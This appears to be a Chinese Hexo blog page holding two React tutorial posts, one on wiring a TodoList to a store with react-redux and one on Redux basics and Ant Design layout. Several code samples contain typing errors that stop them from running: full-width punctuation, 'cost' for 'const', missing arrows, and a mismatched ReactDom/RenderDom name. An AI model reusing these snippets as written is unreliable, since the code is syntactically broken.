<h4 id="10-3-在TodoList-js中使用store中的数据"><a href="#10-3-在TodoList-js中使用store中的数据" class="headerlink" title="10.3 在TodoList.js中使用store中的数据"></a>10.3 在TodoList.js中使用store中的数据</h4><p>首先在TodoList.js中引入store;</p>
<p>并在构造函数中通过store设置setState;</p>
<p>然后在input中加入对state的引用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store/index'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.state=store.getState();</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        	&lt;div&gt;</span><br><span class="line">            	&lt;div&gt;</span><br><span class="line">                    &lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125;/&gt;</span><br><span class="line">                    &lt;button&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/</span>div&gt;</span><br><span class="line">            	&lt;ul&gt;</span><br><span class="line">            		&lt;li&gt;VUE&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/u</span>l&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p>那我们该如何使用React-Redux呢？</p>
<h4 id="10-4-使用React-Redux"><a href="#10-4-使用React-Redux" class="headerlink" title="10.4 使用React-Redux"></a>10.4 使用React-Redux</h4><p>在index.js文件中，之前是直接渲染TodoList，现在我们引入react-redux，并且声明一个App，将TodoList传给App，最后将App传给RenderDom使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> TodoList <span class="keyword">from</span> <span class="string">'./TodoList'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App=（</span><br><span class="line">	&lt;Provider&gt;</span><br><span class="line">      &lt;TodoList /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">）；</span></span><br><span class="line"><span class="regexp">RenderDom.render(App, document.getElementById("root"));</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/RenderDom.render(&lt;TodoList /</span>&gt;, <span class="built_in">document</span>.getElementById(<span class="string">"root"</span>));</span><br></pre></td></tr></table></figure>
<p>这里将TodoList组件传给了Provider组件，Provider组件来自于react-redux。</p>
<p>provider组件可以做什么呢？provider可以提供链接store的能力</p>
<p>我们继续引入store，然后在provider组件中使用如下，这样Provider内的所有组件都有获取store的能力</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App=（</span><br><span class="line">	&lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">      &lt;TodoList /&gt;</span><br><span class="line">    &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">）；</span></span><br></pre></td></tr></table></figure>
<p>此时TodoList组件有获取store的能力了，它怎么获取store呢？</p>
<p>此时我们在TodoList.js中就可以改变获取store的方式了，首先引入react-redux中的connnect，然后到处connect方法。connect的方法是让TodoList和store做连接</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        	&lt;div&gt;</span><br><span class="line">            	&lt;div&gt;</span><br><span class="line">                    &lt;input value=&#123;<span class="keyword">this</span>.state.inputValue&#125;/&gt;</span><br><span class="line">                    &lt;button&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/</span>div&gt;</span><br><span class="line">            	&lt;ul&gt;</span><br><span class="line">            		&lt;li&gt;VUE&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/u</span>l&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default connect(null,null)(TodoList);</span></span><br></pre></td></tr></table></figure>
<p>connect是怎么做连接的呢？首先我们可以创建一个mapStateToProps，然后将它放在connect的一个参数处</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将state中的数据映射给props</span></span><br><span class="line"><span class="keyword">const</span> mapStateToProps=<span class="function">(<span class="params">state</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        inputValue：state.inputValue,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps,<span class="literal">null</span>)(TodoList);</span><br></pre></td></tr></table></figure>
<p>这时我们input中的value就不是等于{this.state.inputValue}了，不使用state了改为props，需要改为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.props.inputValue&#125;/&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们实现onChange方法，在input标签中添加该监听，并且编写一个mapDispatchToProps，将它放在connect的第二个参数处。然后</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&#123;<span class="keyword">this</span>.props.inputValue&#125; onChange=&#123;<span class="keyword">this</span>.props.changeInputValue)&#125;/&gt;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">handleInputChange(event)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//store.dispatch 挂载到props上</span></span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps=(dispatch)=&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        changeInputValue(e)&#123;</span><br><span class="line">    		<span class="keyword">const</span> action=&#123;</span><br><span class="line">                type:<span class="string">'change_input_value'</span>,</span><br><span class="line">                value:e.target.value,</span><br><span class="line">            &#125;;</span><br><span class="line">			dispatch(action);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps,mapDispatchToProps)(TodoList);</span><br></pre></td></tr></table></figure>
<p>然后就可以在reduce中做处理了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState=&#123;</span><br><span class="line">    inputValue:<span class="string">''</span>,</span><br><span class="line">    list:[],</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state=defaultState,action)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(action.type===<span class="string">'change_input_value'</span>)&#123;</span><br><span class="line">    	cost newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.inputValue=action.value;</span><br><span class="line">        <span class="keyword">return</span> newState;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里对react-redux的使用就讲解的差不多了，</p>
<p>接下来我们给button添加一个监听，然后在mapDispatchToProps中添加这个监听函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onClick=&#123;<span class="keyword">this</span>.props.handleClick&#125;&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">...</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapDispatchToProps=(dispatch)=&#123;</span></span><br><span class="line"><span class="regexp">    return &#123;</span></span><br><span class="line"><span class="regexp">        changeInputValue(e)&#123;</span></span><br><span class="line"><span class="regexp">    		const action=&#123;</span></span><br><span class="line"><span class="regexp">                type:'change_input_value',</span></span><br><span class="line"><span class="regexp">                value:e.target.value,</span></span><br><span class="line"><span class="regexp">            &#125;;</span></span><br><span class="line"><span class="regexp">			dispatch(action);</span></span><br><span class="line"><span class="regexp">    	&#125;，</span></span><br><span class="line"><span class="regexp">        handleClick(e)&#123;</span></span><br><span class="line"><span class="regexp">            /</span><span class="regexp">/...</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">	&#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后在做action类型的处理即可，不再重复。</p>
<p>同理对于列表，可以这么处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">this</span>.props.list.map(<span class="function">(<span class="params">item,index</span>)=&gt;</span>(&#123;<span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>&#125;));</span><br><span class="line">	&#125;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">...</span></span><br><span class="line"><span class="regexp">const mapStateToProps=(state)=&gt;&#123;</span></span><br><span class="line"><span class="regexp">    return &#123;</span></span><br><span class="line"><span class="regexp">        inputValue：state.inputValue,</span></span><br><span class="line"><span class="regexp">        list:state.list,</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure>
<p>这是代码中出现太多的this.props.XXX，其实可以精简一下，在render函数中使用结构赋值，就可以在直接使用相应的函数了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render()&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;inputValue,list,changeInputValue,handleClick&#125; =<span class="keyword">this</span>.props;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时的TodoList就是一个UI组件，可以改为无状态组件，因为无状态组件性能比较高，可以直接写成函数的形式</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TodoList=<span class="function">(<span class="params">props</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;inputValue,list,changeInputValue,handleClick&#125; =props;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        	&lt;div&gt;</span><br><span class="line">            	&lt;div&gt;</span><br><span class="line">                    &lt;input value=&#123;inputValue&#125; onChange=&#123;changeInputValue&#125;/&gt;</span><br><span class="line">                    &lt;button onClick=&#123;handleClick&#125;&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/</span>div&gt;</span><br><span class="line">            	&lt;ul&gt;</span><br><span class="line">            		&#123;list.map(<span class="function">(<span class="params">item,index</span>)=&gt;</span>(&#123;<span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span>&#125;));&#125;</span><br><span class="line">            	&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> mapStateToProps=<span class="function">(<span class="params">state</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        inputValue：state.inputValue,</span><br><span class="line">        list:state.list,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps=(dispatch)=&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        changeInputValue(e)&#123;</span><br><span class="line">    		<span class="keyword">const</span> action=&#123;</span><br><span class="line">                type:<span class="string">'change_input_value'</span>,</span><br><span class="line">                value:e.target.value,</span><br><span class="line">            &#125;;</span><br><span class="line">			dispatch(action);</span><br><span class="line">    	&#125;，</span><br><span class="line">        handleClick(e)&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps,mapDispatchToProps)(TodoList);</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/09/12/redux中间件/" data-id="ck55it3n1003hcglrkddlgruj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-react中Redux的使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/09/06/react中Redux的使用/" class="article-date">
  <time datetime="2018-09-05T17:56:25.000Z" itemprop="datePublished">2018-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/09/06/react中Redux的使用/">react中Redux的使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><p>react只是一个轻量级的视图框架，想用它做一个大型应用是不可能的，所以需要一个数据层的框架跟它结合起来使用，这时就可以使用redux了。</p>
<h3 id="一、Redux简介"><a href="#一、Redux简介" class="headerlink" title="一、Redux简介"></a>一、Redux简介</h3><p>Redux是一个数据层框架。再react中如果想在组件间传递数据，需要繁琐的数据传递。使用redux，将组件的数据放在一个公共的区域，这样每当这个区域的数据发生的变化时，所有相关的组件都会随着更新。</p>
<p>Redux=Reducer+Flux</p>
<h3 id="二、Redux的工作流程"><a href="#二、Redux的工作流程" class="headerlink" title="二、Redux的工作流程"></a>二、Redux的工作流程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">借书人               借书语句         管理员	 图书记事本</span><br><span class="line">					dispatch   （previousState</span><br><span class="line">                    action）       ，action）</span><br><span class="line">										（newState）</span><br><span class="line">ReactComponents---ActionCreators--&gt;Store&lt;--&gt;Reducers</span><br><span class="line">        ^                             |</span><br><span class="line">    	|------------------------------</span><br></pre></td></tr></table></figure>
<h3 id="三、使用antD创建todoList布局"><a href="#三、使用antD创建todoList布局" class="headerlink" title="三、使用antD创建todoList布局"></a>三、使用antD创建todoList布局</h3><h4 id="3-1-初始化一个工程"><a href="#3-1-初始化一个工程" class="headerlink" title="3.1 初始化一个工程"></a>3.1 初始化一个工程</h4><p>初始化一个名为todolist的工程，清洁里面只剩一个index.js的文件；</p>
<p>然后创建一个TodoList的组件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        hello world!</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<h4 id="3-2-安装AntD"><a href="#3-2-安装AntD" class="headerlink" title="3.2 安装AntD"></a>3.2 安装AntD</h4><p>首先进入<a href="https://ant.design/docs/react/introduce-cn" target="_blank" rel="noopener">官网</a>，查看安装教程。</p>
<p>进入工程todolistantd，运行下面的命令，安装Ant D</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install antd --save</span><br><span class="line"></span><br><span class="line"><span class="comment">//或使用yarn安装</span></span><br><span class="line">yarn add antd</span><br></pre></td></tr></table></figure>
<h4 id="3-2-使用AntD"><a href="#3-2-使用AntD" class="headerlink" title="3.2 使用AntD"></a>3.2 使用AntD</h4><p>安装完成后，如何使用AntD呢</p>
<p>首先在组件中引入antD的样式，就可以使用了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br></pre></td></tr></table></figure>
<h5 id="3-2-1-使用antD的Input"><a href="#3-2-1-使用antD的Input" class="headerlink" title="3.2.1 使用antD的Input"></a>3.2.1 使用antD的Input</h5><p>若要使用antD的组件可以直接在使用文档中查找相关组件，通过showCode直接将代码粘贴过来。如我们使用一个input，首先引入Input，然后就能使用了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;<span class="xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">placeholder</span>=<span class="string">"todo info"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p>这样就可以在页面上看到一个input框了，和预计的样式一样。当然，可以给这个Input设置自己的样式，如下面的样式可以将input框宽度设为300px</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Input placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br></pre></td></tr></table></figure>
<p>此时我们想在Input右边添加一个按钮怎么办呢？同理去antD中找Button使用</p>
<h5 id="3-2-2-使用antD的Button"><a href="#3-2-2-使用antD的Button" class="headerlink" title="3.2.2 使用antD的Button"></a>3.2.2 使用antD的Button</h5><p>首先引入Button的引用，然后直接使用即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;<span class="comment">//引入Button</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">        	&lt;Input placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br><span class="line">        	&lt;Button type=<span class="string">"primary"</span>&gt;Primary&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">        	&lt;/</span>div&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p><strong>添加间距</strong></p>
<p>此时觉得input框和button间没有间距，直接连接不太好,想给它们添加个10px的间距，可以这么做：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Input placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginRight</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br></pre></td></tr></table></figure>
<p>这时这两个标签都会紧贴着浏览器，想给它们整体添加一个间距，怎么做呢</p>
<p>可以在最外层的div中添加样式文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">      &lt;div style=&#123;&#123;<span class="attr">marginTop</span>:<span class="string">'10px'</span>,<span class="attr">marginLeft</span>:<span class="string">'10px'</span>&#125;&#125;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">        	&lt;Input placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br><span class="line">        	&lt;Button type=<span class="string">"primary"</span>&gt;Primary&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">        	&lt;/</span>div&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br></pre></td></tr></table></figure>
<p>此时，我们的Input和Button展示的有点样子了，接下来</p>
<h5 id="3-2-3-使用List"><a href="#3-2-3-使用List" class="headerlink" title="3.2.3 使用List"></a>3.2.3 使用List</h5><p>首先引入List组件，</p>
<p>然后在TodoList组件外边创建全局列表数据，</p>
<p>在render中添加List组件</p>
